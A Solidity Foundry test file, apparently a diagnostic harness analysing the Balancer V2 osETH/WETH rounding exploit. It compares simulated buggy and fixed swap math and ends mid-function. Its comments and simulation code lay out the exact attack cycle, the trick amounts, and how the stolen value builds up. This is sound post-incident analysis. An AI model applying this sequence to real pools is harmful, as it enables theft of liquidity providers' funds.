// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/Console.sol";
import {FixedPoint} from "src/FixedPoint.sol";
import {StableMath} from "src/StableMath.sol";

// =============================================================================
// BalancerV2 ComposableStablePool osETH/WETH rounding exploit (Nov 2025, ~$120M)
// -----------------------------------------------------------------------------
// Diagnostic harness mirroring the offline math used by BalancerV2_exp.sol's
// prepare_phase2_steps, but logging D and (W, O) at every sub-step. Two modes:
//   (1) "buggy"  : exact replica of BaseGeneralPool._swapGivenOut --
//                  swapRequest.amount = mulDown(amount, sf[indexOut]).
//   (2) "fixed"  : OUT amount upscaled with mulUp instead of mulDown,
//                  removing the user-favouring truncation leak.
//
// =============================================================================
// VULNERABILITY ROOT CAUSE
// =============================================================================
// The rate-providing token osETH has scaling factor sf > 1e18 (~1.0581e18).
// BaseGeneralPool._swapGivenOut upscales the user-requested OUT amount with
// mulDown(amount, sf), which TRUNCATES. The Vault, however, decreases the
// raw OUT balance by `amount` exactly (no rounding) and later re-upscales
// with mulDown(balance, sf). The two paths can produce different upscaled
// post-state O values for the OUT token:
//
//   Curve view : O_up_post_curve = mulDown(O_pre, sf) - mulDown(amount, sf)
//   Vault view : O_up_post_vault = mulDown(O_pre - amount, sf)
//
// Their difference is the floor subadditivity defect:
//   gap = floor((a+b)*sf) - floor(a*sf) - floor(b*sf),  with a=amount, b=O_post_raw
// which is mathematically bounded to {0, 1}. The Curve uses O_up_post_curve
// in its Newton inverse-solver to derive the required amountIn that "preserves
// D". When gap=1, Curve solves on the WRONG D iso-curve (one O_up unit higher
// than reality), under-charging the user. Vault then settles at the truer,
// lower-O state, which lies BELOW the original D iso-curve -> D drops sharply.
//
// =============================================================================
// ATTACK FLOW (Phase 2, single A-B-C cycle)
// =============================================================================
//   Step A : WETH -> osETH (drain), out = (O_pre - trickAmt - 1)
//            Pushes pool to (W_A, trickAmt+1). With trickAmt=17 -> (374353, 18)
//            from initial (67000, 67000). Pre-state D = 138956.
//   Step B : WETH -> osETH (trigger), out = trickAmt = 17
//            Curve: O_up_pre = mulDown(18, sf) = 19,
//                   req_up   = mulDown(17, sf) = 17  (loses 0.988 upscaled),
//                   O_up_post_curve = 19 - 17 = 2.
//            Vault: O_raw_post = 18 - 17 = 1, O_up_post_vault = 1.
//            gap = curve(2) - vault(1) = 1.
//            Curve solves W on (D=138956, O_up=2) iso-curve -> 999845
//            (instead of the geometrically correct 1,415,765 for O_up=1).
//            Attacker pays amountIn = 625,492 W (vs 1,041,412 in FIXED),
//            i.e. UNDERPAYS by 415,920 W. Vault settles to (999845, 1)
//            which has measured D = 112,405, a -26,551 LOSS per cycle.
//   Step C : osETH -> WETH (recycle), DOES NOT return the pool to (67000,67000).
//            The mulDown defect does not fire on this leg (see finding #11),
//            so D moves only by fee/round drift (+692 in the toy cycle, vs the
//            -26,551 stolen in Step B). The exact (W, O) end-state depends on
//            the recycle out-amount the attacker chooses; in the real PoC the
//            Helper.swapGivenOut budgets it precisely so that after many cycles
//            the pool's (W, O) drifts back into the trading band, while the
//            -26,551 D-loss per Step B has already been LOCKED IN and cannot
//            be recovered. testDiag_fullCycleInternals (toy trim() heuristic)
//            ends one cycle at (W=108845, O=5183, D=113097), confirming D
//            stays ~26k below D_pre and (W, O) does NOT return to initial.
//
// Repeated ~30+ times in the PoC, then converted into BPT arbitrage in Phase 3
// to extract the cumulated D-loss as actual token profit.
//
// =============================================================================
// WHY D DROPS SO MUCH (~26,551 per cycle, ~19% of pre-state D)
// =============================================================================
// The damage is the product of TWO independent factors:
//
// FACTOR 1: Rounding gap = 1 (the trigger).
//   Requires {trickAmt * sf} >= 1 - {sf} ~= 0.9419 (a 98.8%-coverage window).
//   trickAmt=17 satisfies it (frac = 0.988). PoC formula floor(1e18/(sf-1e18))
//   gives the smallest n in this window; equivalent gap=1 candidates exist
//   at 17, 34, 51, 68, 86, 103, ... The gap is hard-bounded to <=1 by the
//   floor subadditivity inequality, so this trigger is binary (0 or 1) and
//   cannot be amplified by tweaking trickAmt alone.
//
// FACTOR 2: Vault post-state O = 1 (the geometric amplifier).
//   At the boundary, dD/dO ~ D/(3*O), so O=1 maximises the per-unit-gap loss.
//   With D~138956: dD/dO @ O=1 ~ 46,318 (theoretical), measured ~26,551.
//   Step A's `-trickAmt - 1` formula is what pins vault_post O at exactly 1.
//   Without this pin, the same gap=1 at higher O collapses fast:
//     vault_O=1  -> |dD| =  26,551
//     vault_O=2  -> |dD| =  15,702
//     vault_O=3  -> |dD| =  11,372
//     vault_O=5  -> |dD| =   7,364
//     vault_O=13 -> |dD| =   2,688
//   Decay falls between 1/sqrt(O) and 1/O, matching D ~ W^(2/3)*O^(1/3)
//   evaluated along the trajectory.
//
// Equivalent formulation via the geometric law W ~ O^(-1/2) at fixed D:
//   At D=138,956 the FIXED swap targets (W=1,415,765, O=1) on the iso-curve;
//   the BUGGY swap (Newton on the wrong O_up=2 iso-curve) targets W=999,845.
//   Ratio = 1,415,765 / 999,845 ~= sqrt(2) ~= 1.414 (geometric requirement).
//   The 415,920 W shortfall = the W under-charge per cycle = attacker profit.
//
// =============================================================================
// EXPERIMENTAL FINDINGS (each backed by a testDiag_* in this file)
// =============================================================================
// 1. testDiag_diagramVerify
//    Every number in the BUGGY-vs-FIXED diagram is reproducible from on-chain
//    state + StableMath primitives, no inference needed:
//      sf[osETH] = 1.058132408689971699e18, sf[WETH] = 1e18, A = 200000,
//      fee = 1e14, Step A end (W=374353, O=18, D=138956),
//      O_up_pre=19, req_up=17, curve_post=2, vault_post=1, gap=1,
//      BUGGY end (W=999845, O=1, D=112405), FIXED end (W=1415765, O=1).
//
// 2. testDiag_dDdO_sweep / testDiag_gapAtDifferentO
//    The dominant damage factor is vault_O absolute value (= 1), not the
//    O/W ratio. Holding gap=1 fixed and pushing vault_O from 1 -> 13 collapses
//    |dD| by a factor of ~10. Holding W=999,845 and sweeping O from 1 -> 10000
//    (still O << W, ratio 1%) drops dD/dO from 27,727 to 6 -- a 4600x collapse.
//    "O << W" is necessary to enter the boundary regime; "O = 1" decides the
//    per-unit-gap amplification.
//
// 3. testDiag_gapMagnitudeAtVault1
//    Enumerated trickAmt = 1..200 with vault_post pinned at 1: max gap = 1
//    in every case (189 values give gap=0, 11 give gap=1, none give gap>=2).
//    This empirically confirms the floor subadditivity bound: a single
//    Step B mulDown rounding cannot produce (curve, vault) = (3,1) or (4,1).
//    PoC's (curve=2, vault=1) is the maximum constructible gap.
//
// 4. testDiag_trickAmtOptimum
//    All gap=1 trickAmt candidates {17, 34, 68, 86, 103, ...} are roughly
//    equivalent: |dD| in [25.3k, 27.0k], total cost in [918k, 940k], efficiency
//    in [26.9k, 29.4k] per unit cost. trickAmt=17 is NOT strictly optimal --
//    103 wins by ~3% on both |dD| and total cost. PoC chose 17 because it is
//    the SMALLEST positive solution of {n*sf} >= 0.9419, given by the clean
//    formula floor(1e18 / (sf - 1e18)) = 17 -- engineering simplicity, not
//    numerical optimality.
//
// 5. testDiag_newtonAsymmetry
//    StableMath has two Newton solvers with VERY different stability:
//      INVERSE  _getTokenBalanceGivenInvariantAndAllOtherBalances:
//        Solves a degree-2 polynomial in the unknown balance (positive root
//        of a convex quadratic) and is well-conditioned across the (D, O=1)
//        line. Used internally by every swap path.
//      FORWARD  _calculateInvariant:
//        Iterates D using D_P = D^(N+1)/(n^n * prod). At extreme imbalance
//        (e.g. O=1, W~1.4M) the cubic-in-D term blows up (D_P >> D),
//        Newton oscillates and reverts at sporadic points.
//    This is why FIXED simSwap completes (uses INVERSE Newton, which gives
//    W=1,415,765 cleanly) yet our post-hoc D check at (1,415,765, 1) reverts
//    -- the FORWARD solver fails on that exact point. Both BUGGY and FIXED
//    Step B amountIn are derived from the well-conditioned INVERSE solver.
//
// 6. testDiag_skipB / testDiag_skipA / testDiag_skipC
//    Removing Step B from the cycle eliminates the D drop entirely, while
//    Steps A and C alone roughly preserve D (only minor fee creep). This
//    isolates the leak as a Step-B-only phenomenon: A and C are auxiliary
//    geometric repositioning, the actual theft happens in Step B's rounding.
//
// 7. testDiag_inverseHintAndFeeBreakdown -- Q1: INVERSE hint sensitivity
//    The earlier "INVERSE is globally convergent" claim has a caveat: the
//    initialization computes P_D = balances[0] * n, then for j>=1 multiplies
//    by balances[j] * n and divides by `invariant`. When the starting hint
//    in balances[tokenIndex] is small relative to D, P_D collapses to 0 by
//    integer division, and the next line divUp(inv2, Ann * 0) reverts.
//    Verified: at D=5_000_000, O=1, hint W=374353 gives P_D = 1,497,412 / 5e6
//    = 0 -> REVERT. Replacing the hint with W=11M gives P_D=8 -> Newton
//    converges to W=295,655,594. So the iteration body is stable, but the
//    one-shot init requires a hint of order sqrt(D * O) or larger. This
//    explains the only "spurious" REVERT in the INVERSE sweep.
//
// 8. testDiag_inverseHintAndFeeBreakdown -- Q2: 106-unit gap decomposition
//    Standalone INVERSE Newton at (D=138956, O_up=1) returns W=1,415,659,
//    while simSwapGivenOut FIXED Step B settles W_post=1,415,765 -- a
//    106-unit gap. The gap is fully explained by three sequential round-up
//    operations inside the swap pipeline that the bare Newton call skips:
//      (i)  _calcInGivenOut returns finalBalanceIn.sub(balIn).add(1)  -> +1
//      (ii) inRaw = divUp(inUp, sf[WETH]=1e18)                        -> +0
//      (iii) inRaw = divUp(inRaw, 1 - feePercentage)                  -> +105
//    Total: +106. Verified per-step in the test prints. No numerical bug,
//    purely the contract's "round in favour of the LP" pipeline acting on
//    top of the Newton solution.
//
// 9. testDiag_inverseHintAndFeeBreakdown -- Q3: BUGGY is ISOMORPHIC to FIXED
//    Both BUGGY and FIXED W_post are produced by the SAME Newton solver on
//    the SAME invariant=138,956 -- they only differ in which O_up slot is
//    fed into Newton:
//      FIXED  Newton input: balances = [up_W_pre=374353, O_up=1]
//             newW=1,415,659; +1 (.add(1)) + 105 (fee divUp) = W_post=1,415,765
//      BUGGY  Newton input: balances = [up_W_pre=374353, O_up=2]
//             newW=  999,781; +1 (.add(1)) +  63 (fee divUp) = W_post=  999,845
//    The only divergence is the O_up slot:
//      FIXED uses mulUp(17, sf) = 18 -> 19 - 18 = 1
//      BUGGY uses mulDown(17, sf) = 17 -> 19 - 17 = 2
//    so 999,845 IS the back-solve of D=138,956, just on the WRONG iso-curve
//    (the one that assumes the OUT slot ends at O_up=2 instead of the truer 1).
//    Verified by simSwap sanity check matching W_post in both modes exactly.
//
// 10. testDiag_inverseHintAndFeeBreakdown -- Q4: where the 26,551 D loss lives
//    Independent _calculateInvariant on the two views of the BUGGY landing:
//      curve-imagined (W_up=999845, O_up=2):  D = 140,132
//      vault-actual   (W_up=999845, O_up=1):  D = 112,405
//      D_pre (Step A end):                    D = 138,956
//    So per-cycle theft = D_pre - D_vault = 26,551, while the "curve thinks
//    we are here" point sits at D=140,132 (slightly above 138,956 because the
//    +1 + fee markup pushes W past Newton's exact 999,781). The 27,727 gap
//    between curve and vault D values at the W=999,845 point IS the geometric
//    expression of the rounding theft. Curve under-charges the user by ~415,920
//    upscaled W units (= 1,415,765 - 999,845) per cycle; that "missing W"
//    becomes "missing D" because the vault settles on a strictly lower iso-curve.
//
// 11. testDiag_fullCycleInternals -- per-step Curve view vs Vault view print
//    Runs ONE complete A-B-C cycle in BUGGY mode from (W=67000, O=67000) and
//    prints, at every step, both the Newton input the curve actually sees and
//    the raw/upscaled balances the vault actually records. Verified numbers
//    (no inference, all from on-chain StableMath calls):
//
//      ---- Step A (W->O, out=66982) ----
//        outUp = mulDown(66982, sf) = 70,875
//        Newton input = (W_up=67000, O_up=70894-70875=19)
//        Newton newW  = 374,321 ; inUp=307,322 ; +fee delta=+31 -> inRaw=307,353
//        Vault post   = (W=374353, O=18) ; up=(374353, 19)
//        Curve imag.  = (W_up=374322, O_up=19)
//        GAP W = -31  (fee markup)        GAP O = 0   (no mulDown trigger)
//        D: 137,893 -> 138,956  (+1063 = fee accrual to LPs, NORMAL)
//
//      ---- Step B (W->O, out=17, TRIGGER) ----
//        outUp = mulDown(17, sf) = 17     (loses 0.988 upscaled units)
//        Newton input = (W_up=374353, O_up=19-17=2)   <-- WRONG O_up
//        Newton newW  = 999,781 ; inUp=625,429 ; +fee delta=+63 -> inRaw=625,492
//        Vault post   = (W=999845, O=1) ; up=(999845, 1)
//        Curve imag.  = (W_up=999782, O_up=2)
//        GAP W = -63  (fee markup, NORMAL)
//        GAP O = +1   <-- ACTUAL BUG: curve thinks O_up=2, vault has O_up=1
//        D: 138,956 -> 112,405 (-26,551 STOLEN)
//
//      ---- Step C (O->W, out=trim(W)=990000 reverts, retry 891000) ----
//        outUp = mulDown(891000, sf=1e18) = 891000
//        Newton input = (W_up=108845, O_up=1)         <-- O_up=1 already
//        Newton newW  = 5,482 ; inUp=5,482 ; +fee delta=+1 -> inRaw=5,182
//        Vault post   = (W=108845, O=5183) ; up=(108845, 5484)
//        GAP W = -1   (fee markup)        GAP O = 0   (no mulDown trigger)
//        D: 112,405 -> 113,097 (+692 fee creep, does NOT recover the -26,551)
//
//      Final: (W=108845, O=5183, D=113097) -- 41,845 W above init, 61,817 O
//      below init. Step C does NOT return to (67000, 67000) under the toy
//      trim() heuristic; the real PoC budgets recycle precisely via
//      Helper.swapGivenOut. Either way, Step B's D loss is permanent.
//
// 12. testDiag_fullCycleInternals -- "fee gap" vs "bug gap" are different things
//    The W gap (curve_imagined - vault_post) shows up in EVERY swap (A: -31,
//    B: -63, C: -1) and is purely the LP fee markup: _swapGivenOut runs
//    inRaw = divUp(inRaw, 1 - fee) AFTER the curve's _calcInGivenOut, and the
//    resulting inRaw is recorded into the vault balance. So vault W ends up
//    "fee delta" units above the Newton-self-consistent W. This is INTENDED
//    LP yield; it slightly INCREASES D (Step A: +1063, Step C: +692).
//
//    The O gap (curve_imagined - vault_post) is only nonzero when the floor
//    subadditivity defect fires (Step B: +1, A and C: 0). This is the BUG.
//    Curve: O_up_post_curve = up_pre[O] - mulDown(outAmt, sf)
//    Vault: O_up_post_vault = mulDown(bal_pre[O] - outAmt, sf)
//    Their difference is exactly  floor((a+b)*sf) - floor(a*sf) - floor(b*sf)
//    with a = bal_pre[O] - outAmt, b = outAmt, hard-bounded to {0, 1}.
//    Equivalently, gap_O = 1 iff  {a*sf} + {b*sf} >= 1  (fractional carry).
//
//    FIXED-mode comparison on the same Step B confirms the partition:
//      W gap = -105 (even larger fee markup), O gap = 0, D drop = -105 only.
//    So the O gap is the entire vulnerability; the W gap is normal LP fee
//    accounting that exists in both BUGGY and FIXED.
//
// 13. The "trickAmt = 17 is smallest possible" claim, derived (consistent
//    with Wong's blog formula floor(1e18 / (sf - 1e18)) = 17):
//    Let sf = 1 + eps with eps = 0.058132408689971699. For raw n and small
//    n*eps < 1, {n*sf} = {n*eps} = n*eps. Triggering gap = 1 in Step B
//    (where a = bal_pre[O] - n is forced to 1 by the Step A drain formula
//    -trickAmt - 1) requires:
//      {a*sf} + {n*sf}  >=  1
//      0.0581 + n*eps   >=  1
//      n                >=  ceil(0.9419 / 0.0581)  =  17
//    Larger gap=1 candidates: 17, 34, 51, 68, 86, 103, 120, ... (every ~17
//    raw units, since {n*eps} cycles past 1 - {sf} once every 1/eps ~= 17.2).
//    PoC chose 17 because it is the smallest, not because it maximizes |dD|
//    (testDiag_trickAmtOptimum: 103 actually wins by ~3% on |dD|/cost).
//
// =============================================================================
// PHASE 2 30-ROUND DYNAMICS: WHY (67000, 67000) -> (889, 1472)
// =============================================================================
// findings 14-17, backed by testDiag_perRoundTrace,
// testDiag_counterfactualParallel, testDiag_counterfactualPerRoundIsolated
// and testDiag_isolatedDEffectStepC below.
//
// 14. WETH 67000 -> 889 (net pool W loss = 66,111) IS the bug.
//     Per-round counterfactual (BUGGY vs FIXED, both worlds reset to the
//     actual round-start state each round) shows the per-round
//     counter_W_end - actual_W_end (= W the pool was under-collected by)
//     sums to ~66,111 across 30 rounds. The attacker does NOT "drain" WETH
//     each round; the bug lets him pay slightly LESS W in Steps A+B than
//     the fair price, and the cumulative shortage IS the 66,111 W loss.
//     This is the user-payable counterpart of the per-cycle D drop.
//
// 15. OSETH 67000 -> 1472 (net pool O loss = 65,528) is NOT a bug effect
//     compounded over 30 rounds. ~94% of the O loss happens in ROUND 0
//     ALONE (-61,817 O). The reason is structural: Step A's
//     `out = O_pre - trickAmt - 1` formula forces the pool to (W_A, 18)
//     so the bug can fire in Step B, and Round 0 starts with O=67,000,
//     so the one-shot drain moves ~66,982 O OUT. Subsequent rounds start
//     with O already capped at the Round-0-end level (~5183), Step A can
//     only move a few thousand O, and Step C refunds some O back. Net O
//     movement over rounds 1..29 is only -3,711, with rounds {1, 2, 3, 6,
//     19, 29} actually being NET POSITIVE for the pool's O balance. The
//     "OSETH disappeared" story is "Round 0 split O off in one massive
//     Step A drain", not a per-round bug leak. OSETH loss is a side-effect
//     of the attack's trigger geometry, not of the rounding bug itself.
//
// 16. D is the ONLY quantity that is strictly monotone-decreasing every
//     round. dW and dO have mixed signs across rounds (Round 0 has
//     dW=+41,845, Round 6 has dO=+11,177, etc.), but dD < 0 in EVERY
//     round of the 30-round trace (testDiag_perRoundTrace). This is why
//     D is the right "pool value" metric for this exploit: it isolates
//     the actual theft from the attacker's chosen Step C extraction
//     schedule (ext[r], which is set by the on-chain PoC for Newton
//     convergence, NOT to "barely exceed (inA+inB)"). Cumulative dD over
//     30 rounds ~= -127k; per-round contribution is dominated by the
//     Step B leak (-26,551 in Round 0, smaller in later rounds as the
//     pool shrinks).
//
// 17. D-effect vs bal_W-effect on Step C are OPPOSITE in direction.
//     Holding entry balances [999845, 1] fixed and varying ONLY D between
//     the two worlds (testDiag_isolatedDEffectStepC):
//       D = 112,405 (actual)  -> inO required = 5,181
//       D = 144,956 (counter) -> inO required = 34,580
//     So in isolation, smaller D => Step C charges LESS O (user intuition
//     verified). However, the bug shrinks both D AND bal_W TOGETHER (the
//     two are two faces of the same underpayment): in the real Round 0,
//       BUGGY  Step C entry: (W=999,845,   O=1) D=112,405 -> inO = 5,183
//       FIXED  Step C entry: (W=1,453,904, O=1) D=158,835 -> inO =    11
//     Here the W-shrinkage effect (smaller W => less imbalanced pool =>
//     O priced higher => pool collects MORE O) dominates the D-shrinkage
//     effect (smaller D => pool collects LESS O), so the buggy pool ends
//     up collecting MORE O in Step C than the fixed pool. The clean
//     framing: the entire bug is captured by "Step B under-charges the
//     attacker by ~415,920 upscaled W per cycle"; the D drop, the
//     reshaping of the (W, O) state, and the Step C behaviour all follow
//     mechanically.
//
// 18. Counter-side Step C, under the ATTACKER'S OWN algorithm (trim+x9/10),
//     extracts FAR more W per round and charges FAR more O than the
//     "forced ext=891,000" comparison in finding 17 suggests
//     (testDiag_counterStepC_sameRetryAlgo). At Counter pre-Step-C
//     state (W=1,453,904, O=1):
//       trim(1,453,904) = 1,400,000 -> Attempt 1 in FIXED mode SUCCEEDS
//       (no x9/10 retry needed)
//       Step C end: (W=53,904, O=86,603), inO = 86,602
//     Three Step-C scenarios on the same Round-0 state:
//       (a) Actual  (W=999,845,   O=1) ext=891,000   -> inO=5,183
//       (b) Counter (W=1,453,904, O=1) ext=891,000   -> inO=    11   (forced)
//       (c) Counter (W=1,453,904, O=1) ext=1,400,000 -> inO=86,602  (own algo)
//     Per-W exchange rate (O paid per W extracted):
//       (a) 5,183  / 891,000   ~= 0.00582  O/W
//       (c) 86,602 / 1,400,000 ~= 0.0619   O/W      (~10.6x of (a))
//     i.e. even when Counter picks its OWN locally-optimal extraction,
//     the buggy world still buys W ~10x cheaper than the fixed world
//     would. The bug's value to the attacker isn't just "underpay in
//     Step B" -- it pushes the post-A-B state into a curve region where
//     subsequent Step C O->W swaps are also priced in the attacker's
//     favour, because bal_W is artificially low and the (W, O) ratio
//     is much closer to symmetric.
//     Round-0 pool O balance comparison:
//       Actual  : 67,000 -> 5,184 (loses 61,816 O)
//       Counter (own algo): 67,000 -> 86,603 (GAINS 19,603 O)
//     So in the fixed world the pool's Round-0 osETH balance INCREASES,
//     not decreases. This is independent reinforcement of finding 15:
//     osETH "loss" is not caused by the rounding bug -- removing the
//     bug actually flips the sign of the round-0 O delta.
// =============================================================================

address constant balancer_d = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant osETH_wETH_d = 0xDACf5Fa19b1f720111609043ac67A9818262850c;

interface IPool {
    function getPoolId() external returns (bytes32);
    function getBptIndex() external returns (uint256);
    function getScalingFactors() external returns (uint256[] memory);
    function updateTokenRateCache(address) external;
    function getAmplificationParameter() external returns (uint256, bool, uint256);
    function getSwapFeePercentage() external returns (uint256);
}

contract DiagSim is Test {
    using FixedPoint for uint256;

    uint256 constant ONE = 1e18;

    function setUp() public {
        vm.createSelectFork("ETH", 23717397 - 1);
        vm.warp(1762156007);
    }

    // ---- offline pool math (raw -> upscaled -> curve -> downscaled -> +fee) ----
    // mode == 0 : buggy   (mulDown on OUT amount = real on-chain behaviour)
    // mode == 1 : fixed   (mulUp on OUT amount, removes the user-favouring leak)
    function simSwapGivenOut(
        uint256[] memory bal,        // raw, length 2: [WETH, osETH]
        uint256[] memory sf,         // 18-dec scaling factors
        uint256 idxIn,
        uint256 idxOut,
        uint256 outAmt,              // raw out amount the user requests
        uint256 amp,
        uint256 fee,
        uint8 mode
    ) internal pure returns (uint256[] memory) {
        uint256 balIn = bal[idxIn];
        uint256 balOut = bal[idxOut];

        // Upscale balances: matches _upscaleArray (mulDown)
        uint256[] memory up = new uint256[](2);
        up[0] = bal[0].mulDown(sf[0]);
        up[1] = bal[1].mulDown(sf[1]);

        // The defective line in BaseGeneralPool._swapGivenOut
        uint256 outUp = (mode == 0)
            ? outAmt.mulDown(sf[idxOut])   // truncates -> user-favouring leak
            : outAmt.mulUp(sf[idxOut]);    // counterfactual: no truncation

        uint256 inv = StableMath._calculateInvariant(amp, up);
        uint256 inUp = StableMath._calcInGivenOut(amp, up, idxIn, idxOut, outUp, inv);

        // Downscale IN with divUp, then add swap fee (divUp on (1 - fee))
        uint256 inRaw = inUp.divUp(sf[idxIn]);
        inRaw = inRaw.divUp(ONE - fee);

        bal[idxIn] = balIn + inRaw;
        bal[idxOut] = balOut - outAmt;
        return bal;
    }

    function invUp(uint256[] memory bal, uint256[] memory sf, uint256 amp)
        internal pure returns (uint256)
    {
        uint256[] memory up = new uint256[](2);
        up[0] = bal[0].mulDown(sf[0]);
        up[1] = bal[1].mulDown(sf[1]);
        return StableMath._calculateInvariant(amp, up);
    }

    function trim(uint256 n) internal pure returns (uint256) {
        if (n < 100) return n;
        uint256 b = n;
        uint256 p = 1;
        while (b > 100) { b /= 10; p *= 10; }
        return n / p * p;
    }

    // Variant where caller supplies trickAmt explicitly (instead of using the
    // sf-derived optimum 17). Logs W and O at every cycle end so we can compare
    // final balances side-by-side.
    function runScenarioTrick(uint8 mode, uint256 initBalance, uint256 cycles, uint256 trickAmtCustom) internal {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];

        uint256[] memory bal = new uint256[](2);
        bal[0] = initBalance;
        bal[1] = initBalance;
        uint256 amount = bal[1];

        emit log_named_string("=== mode", mode == 0 ? "BUGGY (mulDown)" : "FIXED (mulUp)");
        emit log_named_uint("trickAmt (custom)", trickAmtCustom);
        emit log_named_uint("init D", invUp(bal, sf, amp));

        for (uint256 r = 0; r < cycles; r++) {
            // Step A
            bal = simSwapGivenOut(bal, sf, 0, 1, amount - trickAmtCustom - 1, amp, fee, mode);
            // Step B
            bal = simSwapGivenOut(bal, sf, 0, 1, trickAmtCustom, amp, fee, mode);
            // Step C with retry-on-revert
            uint256 want = trim(bal[0]);
            bool ok = false;
            for (uint256 j = 0; j < 5; j++) {
                try this.ext_simSwap(bal, sf, 1, 0, want, amp, fee, mode) returns (uint256[] memory nb) {
                    bal = nb; ok = true; break;
                } catch { want = want * 9 / 10; }
            }
            if (!ok) { emit log_string("Step C failed all retries"); break; }
            emit log_named_uint("cycle", r);
            emit log_named_uint("  W", bal[0]);
            emit log_named_uint("  O", bal[1]);
            emit log_named_uint("  D", invUp(bal, sf, amp));
            amount = bal[1];
        }
    }

    // skipMask bits: 1=skip A, 2=skip B, 4=skip C
    function runScenarioSkip(uint8 mode, uint256 initBalance, uint256 cycles, uint8 skipMask) internal {
        bytes32 poolId = IPool(osETH_wETH_d).getPoolId();
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38); // osToken
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        // 2-token view: drop the BPT slot (index 1 in this pool).
        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0]; // WETH
        sf[1] = rawSf[2]; // osETH

        // trickAmt = floor(1e18 / (sf - 1e18)) for the OUT token (osETH here)
        uint256 trickAmt = ONE / (sf[1] - ONE);

        uint256[] memory bal = new uint256[](2);
        bal[0] = initBalance; // WETH raw
        bal[1] = initBalance; // osETH raw
        uint256 amount = bal[1];

        emit log_named_string("=== mode", mode == 0 ? "BUGGY (mulDown)" : "FIXED (mulUp)");
        emit log_named_uint("trickAmt (osETH raw)", trickAmt);
        emit log_named_uint("init D", invUp(bal, sf, amp));

        for (uint256 r = 0; r < cycles; r++) {
            if ((skipMask & 1) == 0) {
                bal = simSwapGivenOut(bal, sf, 0, 1, amount - trickAmt - 1, amp, fee, mode);
                emit log_named_uint("A D", invUp(bal, sf, amp));
            }
            if ((skipMask & 2) == 0) {
                bal = simSwapGivenOut(bal, sf, 0, 1, trickAmt, amp, fee, mode);
                emit log_named_uint("B D", invUp(bal, sf, amp));
            }
            if ((skipMask & 4) == 0) {
                uint256 want = trim(bal[0]);
                bool ok = false;
                for (uint256 j = 0; j < 5; j++) {
                    try this.ext_simSwap(bal, sf, 1, 0, want, amp, fee, mode) returns (uint256[] memory nb) {
                        bal = nb; ok = true; break;
                    } catch { want = want * 9 / 10; }
                }
                if (!ok) { emit log_string("Step C failed all retries"); break; }
                emit log_named_uint("C D", invUp(bal, sf, amp));
            }
            emit log_string("---");
            amount = bal[1];
        }
    }

    function runScenario(uint8 mode, uint256 initBalance, uint256 cycles) internal {
        runScenarioSkip(mode, initBalance, cycles, 0);
    }

    function ext_simSwap(
        uint256[] memory bal, uint256[] memory sf,
        uint256 idxIn, uint256 idxOut, uint256 outAmt,
        uint256 amp, uint256 fee, uint8 mode
    ) external pure returns (uint256[] memory) {
        return simSwapGivenOut(bal, sf, idxIn, idxOut, outAmt, amp, fee, mode);
    }

    function testDiag_buggy() public {
        runScenario(0, 67000, 6);
    }

    function testDiag_fixed() public {
        runScenario(1, 67000, 6);
    }

    // Only A + C, skip B (mask = 0b010 = 2)
    function testDiag_skipB() public {
        runScenarioSkip(0, 67000, 6, 2);
    }

    // Only B + C, skip A (mask = 0b001 = 1)
    function testDiag_skipA() public {
        runScenarioSkip(0, 67000, 6, 1);
    }

    // Only A + B, skip C (mask = 0b100 = 4)
    function testDiag_skipC() public {
        runScenarioSkip(0, 67000, 6, 4);
    }

    // Real attack: trickAmt = 17 (sf-derived optimum, max leak per swap)
    function testDiag_trick17() public {
        runScenarioTrick(0, 67000, 6, 17);
    }

    // Counterfactual: trickAmt = 1 (smallest possible, leak ≈ 0.058 upscaled units per swap)
    function testDiag_trick1() public {
        runScenarioTrick(0, 67000, 6, 1);
    }

    // Directly measure D at the three concrete (W, O) points the bug walkthrough
    // claims, instead of inferring them. Also runs the FIXED (mulUp) variant of
    // Step B to measure the actual amountIn / final state for comparison.
    function testDiag_verifyClaims() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];

        // Direct D measurements at the three claimed points.
        uint256[] memory p_A = new uint256[](2);
        p_A[0] = 374353; p_A[1] = 18;
        uint256[] memory p_hyp = new uint256[](2);
        p_hyp[0] = 999845; p_hyp[1] = 2;
        uint256[] memory p_real = new uint256[](2);
        p_real[0] = 999845; p_real[1] = 1;

        emit log_string("=== direct D measurement at three points ===");
        emit log_named_uint("D at (374353, 18)  [Step A end, measured]", invUp(p_A, sf, amp));
        emit log_named_uint("D at (999845, 2)   [post-fee hyp]        ", invUp(p_hyp, sf, amp));
        emit log_named_uint("D at (999845, 1)   [Vault real end]      ", invUp(p_real, sf, amp));

        // The "real" hypothetical the curve solves for is the PRE-fee state.
        // Reconstruct it: inUp_preFee = inRaw_paid * (1 - fee), since sf[W] = 1.
        emit log_string("=== reconstruct pre-fee hypothetical (curve's true target) ===");
        emit log_named_uint("swap fee (1e18)", fee);
        uint256 inRaw_paid = 625492;                                  // measured
        uint256 inUp_preFee = inRaw_paid * (ONE - fee) / ONE;          // back out pre-fee
        uint256 W_preFee_hyp = 374353 + inUp_preFee;
        emit log_named_uint("inRaw paid (with fee)", inRaw_paid);
        emit log_named_uint("inUp pre-fee (curve's solution)", inUp_preFee);
        emit log_named_uint("W_preFee hypothetical = W_pre + inUp_preFee", W_preFee_hyp);

